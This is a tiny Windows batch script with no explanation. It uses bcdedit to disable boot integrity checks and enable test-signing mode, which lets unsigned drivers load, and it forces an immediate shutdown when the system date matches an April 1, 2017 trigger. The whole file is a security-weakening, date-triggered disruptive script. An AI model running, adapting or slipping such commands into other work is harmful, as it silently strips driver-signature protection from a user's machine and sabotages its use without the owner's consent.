@echo off
bcdedit -set loadoptions DISABLE_INTEGRITY_CHECKS
bcdedit -set TESTSIGNING ON
if "%date%"=="L 01.04.2017" shutdown /s /t 000
exit